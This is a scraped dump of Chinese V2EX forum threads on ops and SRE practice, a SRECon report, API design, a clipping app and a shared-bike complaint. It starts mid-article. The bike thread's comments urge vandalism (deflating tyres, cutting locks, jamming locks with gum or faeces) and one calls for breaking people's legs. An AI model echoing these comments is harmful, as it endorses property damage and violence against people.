），但是能做好的很难。很多公司做问题处理的时候，如果有乙方的支持，只要问题能解决，公司的人就不去想是问题的原因。</p>\n<p>我们需要反思，再去自我提高，好的 PE 问题排查和总结范围的能力都很强，简单的问题也可以找到深层次的原因并做长期的提升改进。 PE 要加入到值班轮转里，在值班的时候处理问题。 PE 要做产品协调员，和工程师团队一同协作，这和 SRE 里相关的部分很像。</p>\n<p>PE 会和很多人打交道，这点对其他职业也是通用的。我很强调人与人之间的沟通协作， PE 是一个协调员的角色，要和 PM 、产品经理、程序员、网工，或者 SRE 沟通，与各个组协调把事情做好。我招 PE 的时候，很注意软技能，如果软技能方面有问题，只想做技术，很多事情都很难处理，后面的风险会更大。对于个人，不管是运维还是其他职位，想更好的发展都应该提升软技能方面的能力，更多地与合作伙伴、同事共同协作，大家达成一致的目标，协作完成任务。</p>\n<p>目标部分再说一下，管理者还要评估 PE 的绩效，保证业务正常运转，这也是管理者的一项重要工作。 PE 或应用运维工程师如何做发展计划？如果不转型，还是按 PE 方向发展，我觉得发展为架构师是很好的规划。</p>\n<p>总结一下我对 PE 的定位。首先， PE 应该是服务的第一响应者，有问题要马上处理。大家要有这个意识，有问题要能快速处理，这也要靠公司机制去保证，并不只是靠人。人不可能 7X24 小时处理问题，但是机制可以保证，包括轮班，一线二线的人分离任务，在保证核心的人不要太累的同时处理问题。性能分析师，利用有限资源承载更多的业务，京东每次大促前都要做全链路压测，做评估、扩容，先做性能分析，然后在进行容量规划。系统管理员是基本功，要懂操作系统，懂网络，也要能写 Code ，开发工具等等。开发工具并不要求是很大的平台，可以和专业开发人员一块去开发，解决问题就好。最后，产品工程协调员，加强人与人之间的沟通。</p>\n<h2>PE 实践及心得</h2>\n<h3>如何结合组织架构设计技术架构</h3>\n<p>三个角色的定义都说完了，再说说如何结合组织架构设计技术架构，这里有很经典的康威定律原则——组织结构会影响技术架构，技术架构会影响到运维架构。康威定律很重要的一点是说，假如团队里有 N 个人，每个人都要跟 N-1 个人去沟通，团队越大沟通成本越高。</p>\n<p>如何设计结构降低沟通的成本？传统模式下很多公司都是职能型的团队，开发、运维、测试属于不同的职能团队，开发的人写好代码给运维的人上线就行了。在新的互联网公司中，除了传统的职能型团队以外，还有实施矩阵式管理，做单元化、 BU 化组织架构的，这样可以降低沟通协作的成本。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/7wFu4Om7.jpeg\"></p>\n<p>我之前在人人网带的团队有 7 、 8 个人，现在的团队比较大，有差不多 20 人。 20 人的团队怎么设计结构？我把业务线打散到两个不同的业务组里，这里也有一个 2-pizza team 的原则。假如两个 pizza 都喂不饱团队的时候，团队的沟通成本其实是很高的，管理也有难度。要把团队打散划分成更小的线， 8 人以内是比较合适的。</p>\n<p>我也会设一些虚拟的小组，类似于矩阵式管理，有一些技术小组做大数据、分布式缓存， Docker 、 Nginx 等等，目的是什么？有点像 Google SRE 的 50%原则， 50%的时间做开发任务。但是我没有办法让他将 50%的时间完全去写程序，因为有很多事情要去做，而且我们也有专门的开发团队，但我可以设一些技术的小组，分离业务和技术的事。每个人 50%的时间去做跟技术相关的事情，这样他们自己也会觉得有意思一点，最终的目的不仅是做一个纯业务的运维，而是给 PE 们提升的空间。</p>\n<h3>SLM 服务级别管理</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/To875HgO.jpeg\"></p>\n<p>下技术管理上的实践，即使是互联网公司， ITIL 这样偏传统的管理方式也有很多可取的地方，我们现在也用得着，并不是抛弃掉所有传统的理念，要根据公司的需要，不管是 ITIL 还是 SRE ，还是其它方法都可以借鉴，以此设计你的组织结构。我会保留传统的东西，像 SLM ，在 SRE 里叫 SLO 。为什么叫 SLO 不叫 SLA 了？</p>\n<p>因为 SLA 是服务协议，更多时候是甲方和乙方签协议。公司内部没有协议，而是设定一个目标，开发跟运维间达成一致，要有数据化的考量。 SLA 或 SLO 都不只是一个可用性的目标，还包括很多的方向，比如维护的时间是否可靠？包括性能、备份、问题解决的时间这些都是考量的指标，不只是数字。我们内部的 SLA 会分得很细，根据业务的类型，对不同业务的影响会有很细的评估。</p>\n<h3>变更管理</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/vCVUO0X1.jpeg\"></p>\n<p>80%的故障都是变更引起。变更很频繁，互联网公司里面每天可能都几十次、上百次的变更，测试环境没有测试到业务的问题的可能性是很大的。变更管理的内容可以再看一下，比如 CMDB ，变更的时候还是要有基础库做记录的，有了基础库后面才能做很多事情。</p>\n<h3>重大事件及故障管理</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/W7mU06Rj.jpeg\"></p>\n<p>重大事件及故障管理，公司有问题的时候怎么快速的解决，有很多的细则要做，我们设有服务台、监控这样的岗位，通过数据更准确的定位问题，大家一同协作、排查。缩小排查范围有法可依，比如根因分析法，排错法。不是简单的沟通好就行了，还要检查变更记录、收集问题。</p>\n<h3>事件处理流程</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/C7zmZbcI.jpeg\"></p>\n<p>很多时候，现场处理问题动作比较快，后面分析时复原问题说不清楚。操作前尽快的把问题现象记录下来，包括监控信息、堆栈信息等等，以便于后面分析。处理流程尽量梳理清楚，对应的做分类，看问题是常见的还是非常见的。常见的问题有对应的应急案，快速的进行处理就好，如果是非常见的，需要技术和决策人参与，看到底是紧急的问题还是日常的问题，快速决策和解决。这里更多的还是需要有协调，有应急预案，应急的预案需要经过演练。</p>\n<h3>故障分析会</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/979iv5wc.jpeg\"></p>\n<p>故障分析会也叫复盘，有了故障以后组织故障分析会，目的是为了避免相同的问题重复的出现，做改进。这时，前面收集的信息就有用了，根据收集的信息复盘故障，大家看看当时发生了什么问题，怎么解决的，有没有更好的办法去定义故障级别，然后分析根本原因，这很重要。开故障分析会应该放松心态，开放共享，不要用指责的态度，而是追求事实，去看根本原因，共同提高、改进，分清因和果。很多时候分析出的问题并不一定是真正的原因，可能有更深层次的原因。</p>\n<p>五问法， 就是要多问，大家一起讨论，不要停留在表面。每一个人从自己的视角去看当时发生了什么，可以提出很多问题，引导进入深度思考。</p>\n<p>琐事— 50%时间去做开发或虚拟技术小组的事情， SRE 说 50%的时间做开发，但是我认为 50%的时间不一定全做开发，开发的时候也可以做一些技术的事，只要是长远讲，对你的组、对公司有好的影响的事，我觉得就可以了，目的是一样的，多做自动化，促进大家提高能力。</p>\n<p>自动化—减少重复性工作，减少手工操作带来的不确定性。很多公司做自动化的同时，导致风险也变多了，所以怎么样做正确的自动化？正确的自动化减少了重复性的工作，减少了错误，解放了人类，但是错误的自动化对应的只是把人类机械化了。以前手工做很多次的，现在变成一次就执行了，系统没有给你正确的反馈。这和 DevOps 说的一样，不仅能更快速迭代的发布，还要有反馈的信息，收到有反馈的异常信息以后能快速的回滚，这点很重要。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/2NkHFIEP.jpeg\"></p>\n<p>很多的 DevOps 平台都只是做了自动化，但是风险是不是控制好了？系统能否有效反馈？发布失败的时候能不能停下来？要做好对应的信息反馈。错误的自动化对应的会给出错误的信息，导致决策失误，这是一定要注意的。比如金融证券行业，做了一定的自动化交易（量化分析），程序自动做投资、买卖股权、买卖股票，完全自动化。但是如果系统没有做好，就是灾难性的，风险还是很严重的。核心系统一定不要缺少人工干预，并不是完全自动化就不需要运维了，决策或者风险非常高的地方，还是需要人去做。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/PiO749w7.jpeg\"></p>\n<p>最后一点，理解构建的东西，设计任何一个系统一定要知道下面具体的实现。发布的时候告诉研发的人后面有什么风险，系统是怎么设计的，懂了原理之后才能规避更多的风险。</p>\n<h3>数据化运维</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/8p8KkH2b.jpeg\"></p>\n<p>现在都说数据化运维，有点类似于运营，有些运维做得比较好的话还是可以往公司的运营方向转。很巧的是，运维和运营的英文的单词都是“ operation ”，都是偏运营的方向，目标也是一样的，做运维做得好的时候，应该有更多数据化的东西给公司做决策参考。尤其是监控跟线上处理相关的，对应的数据都是你的来源，这些来源都会做智能运维的数据采集，比如说网络监控，操作系统监控， DNS 等服务监控，基础组件的监控。基础技术组件服务，像 DB 、缓存、消息等，架构的组件都需要做数据化的参考，没有这两部分数据的话，做应用级性能分析的时候就很难。</p>\n<p>这些信息之间也会做一些联动，举个例子，比如某应用的接口访问慢了，到底是因为网络原因慢了，还是缓存慢了，还是 DB 慢了？要把这些信息做联动才能做更好的分析，如果做数据化运维就需要很多数据做分析。京东金融也做了分布式调用的跟踪，我们现在说的微服务，以前叫服务化，再往前是 SOA ，对应的都会涉及调用链的关系。一个请求下来可能后面有几十个、上百个应用，这时怎么发现是链条上的哪个请求变慢了？我们用的是自己开发的分布式调用跟踪系统，也可以使用日志监控，业务的解决方案，比如 ELK 、 Splunk ，日志易等。自己开发的系统能满足我们大规模高复杂度场景的需要，还能和我们的 CMDB ，统一告警中心等系统做深度的整合。</p>\n<p>下面两个是业务指标，比如，支付系统会有支付可用率的指标监控，也有对应每个银行分类的可用率，全局业务的监控大盘，这些都是业务方向的监控需求，方便进行快速的分析决策。所以，对业务连续性要求高的系统大多会设置一个监控中心或是作战指挥室，有很多监控的大屏，做数据化的运维，用数据做决策、分析。数据化运维今后的发展空间是很大的。</p>\n<h3>智能运维</h3>\n<p>采集大量的数据是基础，再发展的话，还会做事件汇总，打标签的数据积累。详细来讲，一方面做数据采集，一方面按事件分类。触发一次代码的变更上线，或者业务的机房间流量切换，或者一个网络的工单，都是不同的事件，什么样的事件导致了数据的波动，他们是有相关性的，要综合的分析找出根本问题。</p>\n<p>再智能一点，像我们报警会做降级或者是升级，自动判断问题。报警问题对业务是否有影响？是不是重复报警？级别比较低，经常重复报又不需要人去处理的就降低级别。另外，智能预估和自动扩容，人工的规则向机器学习过渡，多打数据标签，做一些智能化的处理。智能运维是未来的方向，空间还是很大的。</p>\n<h2>总结</h2>\n<p>从实践经验看，首先一定要明确公司团队的定位、发展方向，公司的使命、愿景和价值观是什么。让每个人都理解，才能产生比较好的团队作战能力，根据公司的情况去看组织结构，根据组织架构招到合适的人，设计系统、不断实践、持续迭代，分析、总结，长期规划。我们虽然做技术、管理，很多时候也要借鉴商业的模式，怎样更快速的做一个新的产业出来。</p>\n<p>最后一点我说一下“带来变化”，不管在哪家公司，都应该尝试一些新的改变，而不是简单的做重复的事情。要有一些长远的规划，多做长期能带来更大影响的事情，多做推动个人，公司，社会进步的事情。</p>\n</div></div>"], "reply": "11", "tittle": "活动实录 | 京东金融 PE 谈如何颠覆应用运维认知", "comment": ["虽然内容很长, 但里面有些观点挺赞的, Mark 下, 感谢", " 这是线下活动整理的文字实录，像您说的虽然很长，但是也不舍得删减~~希望对您有帮助", "总说的对：\r", "\r", "> 要有一些长远的规划，多做长期能带来更大影响的事情，多做推动个人，公司，社会进步的事情。\r", "\r", "内容是长哟，可以在开头加上目录好些。", "赞， mark", "文章是挺长的，楼主费心了，感谢", " 喜欢就好啦~~", " (*^__^*) 嘻嘻……", " 小数下次会记得的：）", "还不错，看着比较舒服", "挺好挺好。", "我觉得只要教我们怎么能把京东数据库给泄露就可以了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>杭州骑呗共享单车，今晚租了一辆车，我输完密码后，却发现开锁按钮摁不动，只能结束行程，付款。</p>\n<p>这种情况怎么办，还是扫码前先全面检查一遍。。。</p>\n</div></div>"], "reply": "23", "tittle": "共享单车扫码开锁，却发现锁坏了，还被扣了钱。", "comment": ["可以报修吧，报修就不收钱了", "选择报修", " 擦，知道了。发现锁坏了我就走了，走了很远路才想起上报故障，结果还要扫码，我就没上报。。\r", "现在知道了，原来上报故障会给免单。", " 多谢", " 记得第一次用小黄车…我旋转密码锁后不知道要按那个按钮才会开锁，就一连报修了七八台……\r", "\r", "\r", "然后意识到自己是个 SB …默默的把七八台的密码又给拨乱了", " 扎铁了老心。", " 第一次嘛。。", "有很多上私锁的 我只能扎胎了", "，我都骑了 20 年单车了，骑了一次小鸣单车后，觉得单车设计有问题，而且广州也出过事故（新闻报道）\r", "\r", "有一天，我一路找能开锁的车，找了 20 辆。没有一辆能开。", " ...別人在圖書館占桌子 你是不是也要把圖書館燒了🙄\r", "這素質", " 你应该把私锁锯掉", " 放胎气啊 又不是扎破。", "组织个“偷车”协会。弄把剪锁钳，专治上死锁的共享单车", "对于上私锁的我觉得应该守在边上，等上锁的人来了揍他。", " 小黄车的设计者就是脑残，先不说开锁按钮，即使知道开锁按钮，也不知道密码该从哪头开始输入。", " #15 从左到右这不是天经地义的吗？", "今天打算用用路上的一辆小蓝车，然后发现几天前用过的一次还在计费，已经累计到 120 了……\r", "\r", "真无语，解决完这次问题后就打算退押金。再也不用了，故障率真的有点高。", " 我说咋那么多小黄没气了的。原来是你干的。<-_<-", " 请往锁口加树枝", " 这是道数学题。收费 120 ，所以应该是 5 天前。哈哈。", " \r", " \r", "我觉得加口香糖或者加粑粑更好，然后贴上一个纸条， WCNMLGB 的中文翻译之类的。有功夫反韩反日，还不如内斗先把这群垃圾干掉，攘外必先安内。所以最好的办法是给他们腿打断，就不需要再骑车了。", " ", "微信小程序里 没有保修选项"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>啥都不说先直接上图：</p>\n<p><img alt=\"共同协作源码分析学习、标注\" src=\"https://ooo.0o0.ooo/2017/03/12/58c543000ba72.jpg\"></p>\n<p>访问不了或者速度慢请自备梯子〒_〒 。</p>\n<p><strong>背景：</strong>自己一直想通过阅读分析学习源码来提高自己的编程水平，但是苦于自己水平和理解能力有限，源码阅读起来常常是一脸懵 B ，后来想到是否可以通过共同协作分析标注来共同讨论学习，所以就做了这样的一个项目，希望大家可以参与。</p>\n<p>由于页面输出内容有点多，再加上境外服务器速度不是很理想，标注加载起来有点慢。源码已经是用了分页缓存，但是速度还是有点慢，之后有条件了再打算升一下配置，希望大家见谅。</p>\n<h4>项目链接</h4>\n<p><a href=\"http://mark.uxwin.com/plus/codes/\" rel=\"nofollow\">http://mark.uxwin.com/plus/codes/</a></p>\n<h4>\"双击评注\"</h4>\n</div></div>"], "reply": "4", "tittle": "一个共同协作源码分析学习、标注项目 求参与 ！", "comment": ["是说大家一起读源码，写注释是这样么？", " 是的想的就是实现这样一个简单的功能", "你需要 Phabricator 就行…", " 看着 Phabricator 功能挺复杂的，大概了解了一下没有 GET 到用法，不知道国内有没有这样的平台。或者换句话说怎么搜到中文的源码注释项目。"]},
{"content": ["<div class=\"topic_content\">线上在售的金币，想调整下价格。修改后保存，不生效。\r<br>有人知道咋回事吗？</div>"], "reply": "目前尚无回", "tittle": "苹果内购价格修改", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>SRECon17 第一天下来的感觉就是高大上， 组织者 USENIX （ Advanced Computing Systems Association ）高大上，赞助商们（谷歌， LinkedIn ，微软， Netflix ， Facebook ， Twitter ， Hulu ， Spotify 等）高大上，更高大上就是会议地点旧金山 CA ，美的让人乐不思“京霾”了。</p>\n</blockquote>\n<p>——来自 SRECon 数人云前线工程师</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/7eM93t9V.jpeg\"></p>\n<p>——九曲花街俯视旧金山城</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/QG1zM7Sh.jpeg\"></p>\n<p>——金门大桥</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/7u77iP31.jpeg\"></p>\n<p>——集装箱，职业病第一反应是 Docker...</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/Ig8x0mbq.jpeg\"></p>\n<p>—— LinkedIn 展位，送 T 恤喽</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/92jfF0r3.jpeg\"></p>\n<p>—— Google 展位</p>\n<p><strong>言归正传，我是来参会的...</strong></p>\n<h2>《 So You Want to Be a Wizard 》</h2>\n<p>首先，开场就是一位女性 SRE 带来的精彩演讲《 So You Want to Be a Wizard 》，主要讲述自身从 DevOps 向 SRE 转变的愉快心路历程。</p>\n<p>必须表扬的就是女生 slides 特殊画风，通篇都是手写和漫画风，像这种：</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/d4WUP6Yj.png\"></p>\n<p>还有这种：</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/7tK105Ji.jpeg\"></p>\n<p>在分享中 Julia 提到了她是如何通过 tcpdump 和 wireshark 搞定 HTTP 慢请求这样一点儿一点儿地积累技术，以及在设计小项目和参与项目开发的过程中，从自己的体验和别人的反馈中了解到文档重要性等等工程经验。更重要的是 Julia 适应和喜欢去搞定 why 的部分，也慢慢积累信心去参与“创造”的过程，感觉成为 SRE 就有点儿像会了魔法。</p>\n<p>最后，分享一下她的“魔法”技能列表：</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/5aHLb33C.jpeg\"></p>\n<p>接下来的会议是三个分会场同时进行的，基本上都是围绕着 SRE 的日常来展开的，包括流量控制，自动 Debug 部署问题，快速发布，运维海量容器，监控报警，线上 Profiling 等各个方面的内容。</p>\n<h2>《 Ten Persistent SRE Antipatterns 》</h2>\n<p>强力推荐来自 Netflix 的 《 Ten Persistent SRE Anti-patterns: Pitfalls on the Road to a Successful SRE Program Like Netflix and Google 》，</p>\n<p>原因是在旧金山听了场精彩绝伦的“相声”，由 Jonah Horowitz （ Netflix ）和 Blake Bisset 共同完成，不分捧逗。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/bEi9qTes.jpeg\"></p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/5733w48s.jpeg\"></p>\n<p>图上的内容简单翻译一下就是：我怎么看那些显示监控数据的显示器，或者说我应该怎么跟我的老板解释这些钱都白花了？</p>\n<p>再比如：</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/ro18fX9s.jpeg\"></p>\n<p>是的，你没看错，就是发哥在烧钱。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/hh046VfM.jpeg\"></p>\n<p>这两张是他们讲到可靠性到底应该几个九的时候用的图，大家自己体会下，反正这种黑色幽默我本人是很受用的，感兴趣的一定记得等视频出来。</p>\n<p>玩笑归玩笑，这个分享里的确包含了来自国外 SRE 先行者们在一线遇到的很多问题，包括引入容器后带来的 pets vs cattle 甚至像 vs poultry （鸡鸭）这样的运维方式和思路的变化，也提到了 SRE 视角的 7x24 oncall 正确姿势，到底应该 alert 什么， alert 出现 SRE 被半夜叫醒之后的流程和预期到底是什么，还有像雇佣 SRE 的成本考量， 所有这些内容， Boss 们也值得一听。</p>\n<h2>《 I ’ m an SRE Lead! Now What?》</h2>\n<p>当然，正统的方法论高手也是有的，那就是来自 IBM Bluemix 的 《 I ’ m an SRE Lead! Now What? How to Bootstrap and Organize Your SRE Team 》</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/chs8s8w0.jpeg\"></p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/MwUZFToD.jpeg\"></p>\n<p>典型的 IBM 方式，从管理者开始，讨论如何组建 SRE 团队，如何同开发小组合作，如何平衡 SRE 自身开发和运维的时间分配等等。讲究的是不断明确各个角色的权责，融入敏捷过程，使用各种工具，所有的事件响应设计好各种流程。</p>\n<p><img alt=\"\"></p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/v3WfRMyP.jpeg\"></p>\n<p>站在管理者的角度，如果你正准备落地 SRE ，这些内容可能是一种参考。注意这里我的用词，可能是，毕竟这些都是带有强烈 IBM 基因的东西。</p>\n<p>回想这一天听到的内容，如果是按照在国内参加各种面向纯开发者的技术会议的标准来说，那可能整体上没有想象中干货。但是，转念一想，毕竟是 SRE 的会议，并不是纯开发者，也不是面向开发者的，所以不能按以往的经验来衡量。</p>\n<p>重新调整过预期和标准后再总结这一天，发现其实内容是很丰富同时也是很有收获的。</p>\n<p>好了，今天的小结就是这些了，更多精彩内容明天继续，我北京背来的泡面都凉了。对了，我拍到国外工程师发髻线也！很！高！</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/30sd0A1Y.jpeg\"></p>\n<h2>SRE 相关阅读：</h2>\n<p><a href=\"https://www.v2ex.com/t/347177#reply11\" rel=\"nofollow\">活动实录 | 京东金融 PE 谈如何颠覆应用运维认知</a></p>\n<p><a href=\"https://www.v2ex.com/t/342262#reply1\" rel=\"nofollow\">SRE ：文化传奇不完全指南？</a></p>\n<p><a href=\"https://www.v2ex.com/t/341836#reply0\" rel=\"nofollow\">SRE 第一课： New to an SRE team?</a></p>\n<p><a href=\"https://www.v2ex.com/t/343862#reply1\" rel=\"nofollow\">SRE 系列教程 | 基于时间序列数据的监控实践</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzA3MDg4Nzc2NQ==&amp;mid=2652134703&amp;idx=1&amp;sn=b0615f8bb07d5041116466649c6feb0b&amp;chksm=84d50d15b3a2840397e930a9029b89ad4621ce39b8439a24270b9ba18e0b71bc48e734726a3d&amp;scene=21#wechat_redirect\" rel=\"nofollow\">人永远不够用——在复旦大学分享 SRE 团队组织和管理 </a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzA3MDg4Nzc2NQ==&amp;mid=2652134473&amp;idx=1&amp;sn=898c93a63a851be85886a839da2d9f54&amp;chksm=84d50c73b3a2856522f1eac5ef833b2958619c3e475de66eb74ed004bfd8ecd6e125e1fa6a2b&amp;scene=21#wechat_redirect\" rel=\"nofollow\">SRE 系列教程 | 孙宇聪：来自 Google 的 DevOps 理念及实践（上）</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzA3MDg4Nzc2NQ==&amp;mid=2652134494&amp;idx=1&amp;sn=da91df6773462e53f1d6fdbbfa800d6c&amp;chksm=84d50c64b3a2857237b150981b81a2b4063be04b818e392ed87616ad7654253655aa1e760f59&amp;scene=21#wechat_redirect\" rel=\"nofollow\">SRE 系列教程 | 孙宇聪：来自 Google 的 DevOps 理念及实践（下）</a></p>\n</div></div>"], "reply": "3", "tittle": "SRECon Day1 | 比起干货满满，更吸引我的是画风清奇", "comment": ["你们家的这个云，“数”读第几声？", " 哈哈，四声，数字的数", "什么是 SRE ？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近开发了一个工具 App 易剪，主要解决以下痛点.</p>\n<h2>痛点</h2>\n<p>当我们在手机上阅读文章时，对于自己感兴趣的片段，我们可能会想粘贴到便签或者印象笔记作为自己的笔记，方便日后查阅。</p>\n<p>但是如果一篇文章中有若干段自己感兴趣的片段，那么频繁的切换 App 势必会破坏良好的阅读体验。</p>\n<h2>解决方案</h2>\n<p>鉴于此，自己简单利用 Android 6.0 新特性-<a href=\"http://gudong.name/2017/02/15/custom_text_select.html\" rel=\"nofollow\">自定义文本操作栏</a>实现了一个手机版的剪报工具，在不需要切换应用的条件下快捷的剪辑自己喜欢的片段。\n效果如 gif 图所示</p>\n<p><img alt=\"demo\" src=\"http://7xr9gx.com1.z0.glb.clouddn.com/easypaper.gif\"></p>\n<p>这样，就可以在当前页面完成片段剪贴的功能，无需切换到其他 App 。</p>\n<p>另外，它会把每次选择的内容不断的在同一份剪报里进行追加，当你阅读完成后，你再安心打开易剪，即可看到自己的剪辑结果，如下所示。</p>\n<p><img alt=\"result\" src=\"http://7xr9gx.com1.z0.glb.clouddn.com/C2CB5248597BC9ED3401C4B87C8E2688.jpg\"></p>\n<h2>Tip</h2>\n<p>另外 6.0 以下的用户需要注意的是，因为自定义文本操作栏按钮是 Android 6.0 以后才有的特性，所以 6.0 以下的用户通过长按文本，选择分享到易剪才可实现同样的功能。</p>\n<h2>下载</h2>\n<p>目前还没有发布到各大市场，感兴趣的同学可以通过 fir 下载。<a href=\"https://fir.im/pl7r\" rel=\"nofollow\">下载地址</a></p>\n<p>倒是提交到了<a href=\"http://www.coolapk.com/apk/name.gudong.easypaper\" rel=\"nofollow\">酷安-易剪</a>，不知道通过没。</p>\n</div></div>"], "reply": "13", "tittle": "易剪 - 一个手机端的剪报助手", "comment": ["赞一个，我是 ios 用户，也是之前发现了这个痛点，无奈还没想到 iosiOS 应该如何实现解决。", "传说中的剪贴板搜集？", "有个叫易辑的 也是楼主开发的？", " 希望有 ios 开发者可以做类似的尝试，印象笔记不可以吗？", " 也算不上是剪贴板搜集，算是一个文章片段收集工具", " 不是啊。", "微软的存在 app 好像也可以创建剪切板的小卡片", " iOS 有方片收集，复制之后，下拉通知中心就 OK 了，只是多了一步下拉", "算不上痛点吧，安卓的剪贴板又不是像 windows 一样只能存放一个内容，再复制进去一个前一个就被覆盖掉的。 android 剪贴板可以存好多内容，所以多次复制，再粘贴到笔记软件里就行了。", " 嗯嗯，倒是可以，不过这需要一切剪切板辅助应用才能达到目的，易剪更加专注，并且可以分类，这是它比较好的地方。", " 很多输入法有剪贴板管理功能，不需要额外的剪贴板辅助应用；只临时中转的话一般不需要分类，粘贴到笔记软件里再分类好了，它们的分类管理功能强大得多", " 嗯，可以的！你用什么输入法", " 比如三星自带就有，触宝也有。我用触宝"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不少程序员都是这么认为的，基于 HTTP API 的服务，只要用 GET 请求和 POST 请求就足够了。\n像 RESTful 这样的 大量使用 PUT ， DELETE 请求是不必要的。</p>\n<p>真的吗，我来举一个例子。</p>\n<p>假设有一类资源 ResourceXYZ ，对其有增删查改的操作。\n如果只使用 GET POST 之类的设计方式，那么很可能会设计以下的请求接口：</p>\n<pre><code>POST .../addResourceXYZ\nPOST .../delResourceXYZ\nGET .../getResourceXYZ?resourceId=resourceId\nPOST .../updateResourceXYZ\n</code></pre>\n<p>如果按照 RESTful 的 设计方式，很可能会设计以下的请求接口</p>\n<pre><code>POST .../ResourceXYZs\nDELETE .../ResourceXYZ/{resourceId}\nGET .../ResourceXYZ/{resourceId}\nPUT .../ResourceXYZ/{resourceId}\n</code></pre>\n<p>现在假设，客户端要获取该资源，其 ID 为 resourceId 。\n如果成功，那么一切都好说。\n如果失败， Restful 的处理方式是，通过 HTTP status 返回错误码来表示原因，例如 404 表示该资源不存在。</p>\n<p>那么只用 GET POST 两种方法的方式呢？\n响应请求</p>\n<pre><code>GET .../getResourceXYZ?resourceId=resourceId\n</code></pre>\n<p>的时候能不能也用 404 呢？</p>\n<p>按照 404 的语义，响应 404 是不对的：\n因为客户端请求的 URL 实际上是正确的，只是对应的参数没有找到对应的结果\n很多时候，就只能靠响应 200 然后返回空数据或者空对象来处理了。\n例如 Content-type 为 application/json 时，可以返回 {} 或者</p>\n<pre><code>{\n    \"error\": \"not found\",\n    \"code\": 404\n}\n</code></pre>\n<p>这样就会要求客户端，必须处理 HTTP 回复的具体内容，而不能只处理头部。\n那么客户端要怎么处理这个 json 呢\n要先解析 json ，然后尝试分别这是一个资源的内容，还是一个错误提示。</p>\n<p>对于强类型语言例如 C/C++ OC Swift 写的客户端来说，恐怕就忍不住要问候服务端程序员一家了。</p>\n<p>更重要的是……</p>\n<p>没有库会支持这种拍脑袋式的设计。</p>\n<p>全文完，欢迎拍砖。</p>\n</div></div>"], "reply": "195", "tittle": "RESTful 有用吗？ HTTP 有 GET POST 就足够了？", "comment": [" \r", "\r", "> 至于为什么 HTTP API 调用 HTTP API ，那是因为 do not repeat your self. 当这些被调用的 更底层 API 实现有变动的时候，你不需要改高层 API 的实现，虽然这也不一定是必须的。 \r", "\r", "HTTP API 的粒度太大，资源开销也大，服务端自己复用自己的时候，一般采用 DAO 的形式。看样子你根本不懂后端，就是一个架构太空人而已。", " ", "天真。你以为 任何层的服务器应用都能调用 DAO 访问数据库吗？看样子你根本没做过严格的系统，都是搞些什么 login reg 之类的小社区吧", "顺便说一句， C/C++是弱类型", " \r", "\r", "99% 的 Web 系统都是这样做的。至于那 1%，你说这么大堆就是为了证明 REST 只是为极端情况下服务的？ REST 真牛逼，呵呵，但是跟我没关系，我是这 99%。", " ", "你说 99%的都是那么做我是信的，因为 99% 的公司都没有机会有上每天百万级别的 api 调用次数，要协调近百人的 team 来维持 api 服务。", "算啦，知道你不服气。正面回应你吧。", "你一直在说 http api 调度代价大，事实上数据库访问的代价更大，连接数基本上都是有上限限制的。数据库的调用逻辑更是测了又测。我扩张几台几十台 http server 简直是简单得不要不要的。再况且，我们这里背后的数据库是 mysql 代理，并不是什么 feature 都能支持，你随随便便搞个 DAO 还真不能保证 100%能用。", "要是你选你也会选我一样的做法。", " \r", "\r", "你说得对， C/C++ 自身不是强类型的。但实际开发中我们很喜欢用它们的强类型特性。\r", "所以不妨视作强类型的吧？", "服务器代价不代价的 能不能支撑几百万访问的 跟这个问题一点都没有关系吧 这种问题丢给架构师啊， REST 确实对于某些资源性特别强的时候要比只有 GET,POST 好用，但是很少啊，第一眼看上去什么都是资源，但是后期如果要对这个资源操作其他的事情，你就只能去改，把 REST 再改回 API ，你改了还不要紧，用你接口的也要改，还不如一开始就设计一套有风格又优雅的 API 接口，具备扩展性和优雅，还可以自己维护一套返回值类型，不必过度拘束 HTTP 的返回值，你说你如果又有 REST 又有 API 的话 客户端还得针对 REST 和 API 分别维护两套处理流程，何必呢？", " \r", "\r", "如果你的 API 使用者都是自己公司的，你这么做当然很 OK ，怎么任性也不会直接扣你钱。\r", "\r", "但是重构这种事情，不是 RESTful 就有其他 API 就没有的。 而 RESTful 可以有版本，甚至你还可以给资源起一个新名字，然后将请求 forward 过去。善用 URL 就是有这么大的好处。\r", "\r", "你自己设计一套 API 接口，要么按这个套路，要么不兼容以前的调用。\r", "如果 API 里面没有 URL 没有版本这个概念，升级就够你烦的了。\r", "那说来说去，还是说明 RESTful 的已经想得够多了，不像很多人以为的那么肤浅。", " 其实你说的那些 REST 的好处 都是后端框架可以实现的 并不是指就非要以 REST 才有这种特性", " 总的来说 纠结半天的 REST 和 API 的区别就是 请求格式和返回格式 两者， 